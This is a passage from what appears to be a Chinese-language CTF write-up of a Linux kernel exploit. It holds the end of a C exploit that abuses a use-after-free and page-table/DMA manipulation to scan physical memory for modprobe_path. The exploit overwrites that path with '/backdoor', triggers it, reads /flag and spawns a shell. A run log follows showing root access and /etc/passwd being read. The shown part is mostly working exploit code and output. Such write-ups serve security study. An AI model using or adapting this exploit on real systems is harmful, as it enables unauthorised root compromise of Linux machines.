        if(*(uint64_t*)PTI_TO_VIRT(2, 0, i, 0, 0) != (uint64_t )PTI_TO_VIRT(2, 0, i, 0, 0))
        {
            pte_page = (uint64_t*)PTI_TO_VIRT(2, 0, i, 0, 0);
            printf("[*] Find the pte-1 in 0x%lx, value 0x%lx\n", pte_page, *pte_page);
            break;
        }
	}
    *(uint64_t*)dma_page = 0x8000000000000067;
    uint64_t phys_base;
    for (int i = 0;;i++) 
    {
        flush_tlb(PTI_TO_VIRT(2, 0, 10, 0, 0), 0x200000);
        if (*(uint64_t*)pte_page == 0xe801403f51258d48) {
                printf("\033[32m[+] pte: %#llx  NUMBER TAG: %#llx\n\033[0m", *(uint64_t*)dma_page, *(uint64_t*)pte_page);
                phys_base = *(uint64_t*)dma_page;
                break;
        }
        *(uint64_t*)dma_page = *(uint64_t*)dma_page + 0x100000;
    }


    printf("[*] modprobe path: %s\n", modprobe_path);
    for (int i=0; i < 40; i++) 
    {
        void *pmd_modprobe_addr;
        unsigned long long phys_modprobe_addr;
        unsigned long long modprobe_iteration_base;

        modprobe_iteration_base = phys_base + i * 0x200000;

        printf("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

        // set the pages for the other threads PUD data range to kernel memory
        for (unsigned short j=0; j < 512; j++)
        {
            *(uint64_t *)(dma_page + j * 8) = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000067;
        }

        flush_tlb(PTI_TO_VIRT(2, 0, 10, 0, 0), 0x200000);
        pmd_modprobe_addr = memmem_modprobe_path(pte_page, 0x200000, modprobe_path, strlen(modprobe_path) - 1);
        if (pmd_modprobe_addr != NULL)
        {
            printf("[*] Found modprobe path at physical address 0x%016llx\n", pmd_modprobe_addr);
            break;
        }
    }

    printf("[*] modprobe path: %s\n", modprobe_path);
    sleep(5);
    system("/error");
    // system("/bin/sh");
    // execl("/bin/sh", "sh", NULL);

    char buf[0x100];
    int flagfd = open("/flag", O_RDONLY);
    read(flagfd, buf, 0x100);
    printf("[*] flag : %s\n", buf);
    system("/bin/sh");
    while(1)
    {

    }
    printf("EXIT\n");
    return 0;
}

```

效果：

![](./img/3.png)

```shell
[+] Boot took 2.05
[*] starting up...
[*] Increased fd limit from 1024 to 4096
[*] prepare PTE memory...
[*] executing in first level child process, setting up session and PTY pair...
[*] Begin cc1
[*] Begin cc2
[*] Begin cc3
[*] Launching child process
[*] child : 149, new-child : 150
[*] Find the uaf pid in child : 2
[*] Begin cc4
[*] UAF pid id : 2
[*] Free the uaf pid
[*] Free the uaf pid again
[*] Free finish
[*] Free the struct around uaf pid
[*] Free the struct in first 30 page
[*] Finish cc !
[*] spraying 10 pte's...
[*] spraying finish
[*] Find the pte in 0x10000290000, value 0x100002a0000
[*] Start dma
[*] dma_buf_fd : 7
[*] Start to unmap
[*] spraying finish
[*] Find the dma in 0x10000290000, pte-value 0x800000013fe6a067
[*] Find the pte-1 in 0x10001400000, value 0x10001c00000
[+] pte: 0x8000000050c00067  NUMBER TAG: 0xe801403f51258d48
[*] modprobe path: /sbin/modprobe

[*] setting physical address range to 0x8000000050c00067 - 0x8000000050e00067
[*] setting physical address range to 0x8000000050e00067 - 0x8000000051000067
[*] setting physical address range to 0x8000000051000067 - 0x8000000051200067
[*] setting physical address range to 0x8000000051200067 - 0x8000000051400067
[*] setting physical address range to 0x8000000051400067 - 0x8000000051600067
[*] setting physical address range to 0x8000000051600067 - 0x8000000051800067
[*] setting physical address range to 0x8000000051800067 - 0x8000000051a00067
[*] setting physical address range to 0x8000000051a00067 - 0x8000000051c00067
[*] setting physical address range to 0x8000000051c00067 - 0x8000000051e00067
[*] setting physical address range to 0x8000000051e00067 - 0x8000000052000067
[*] setting physical address range to 0x8000000052000067 - 0x8000000052200067
[*] modprobe path : /sbin/modprobe

[-] false positive. skipping to next one
[*] setting physical address range to 0x8000000052200067 - 0x8000000052400067
[*] setting physical address range to 0x8000000052400067 - 0x8000000052600067
[*] setting physical address range to 0x8000000052600067 - 0x8000000052800067
[*] setting physical address range to 0x8000000052800067 - 0x8000000052a00067
[*] setting physical address range to 0x8000000052a00067 - 0x8000000052c00067
[*] setting physical address range to 0x8000000052c00067 - 0x8000000052e00067
[*] setting physical address range to 0x8000000052e00067 - 0x8000000053000067
[*] setting physical address range to 0x8000000053000067 - 0x8000000053200067
[*] setting physical address range to 0x8000000053200067 - 0x8000000053400067
[*] setting physical address range to 0x8000000053400067 - 0x8000000053600067
[*] setting physical address range to 0x8000000053600067 - 0x8000000053800067
[*] setting physical address range to 0x8000000053800067 - 0x8000000053a00067
[*] setting physical address range to 0x8000000053a00067 - 0x8000000053c00067
[*] setting physical address range to 0x8000000053c00067 - 0x8000000053e00067
[*] setting physical address range to 0x8000000053e00067 - 0x8000000054000067
[*] setting physical address range to 0x8000000054000067 - 0x8000000054200067
[*] setting physical address range to 0x8000000054200067 - 0x8000000054400067
[*] modprobe path : /backdoor

[*] Found modprobe path at physical address 0x0000010001446aa0
/error: line 1: ����: not found
[*] flag : flag{test_flag_ujdbqwdwklqdmwqkldj}

/ $ su root
/ # id
uid=0 gid=0(root) groups=0(root)
/ # cat /etc/passwd
root::0:0:root:/root:/bin/sh
ctf:x:1000:1000:chal:/home/ctf:/bin/sh
/ # 
```

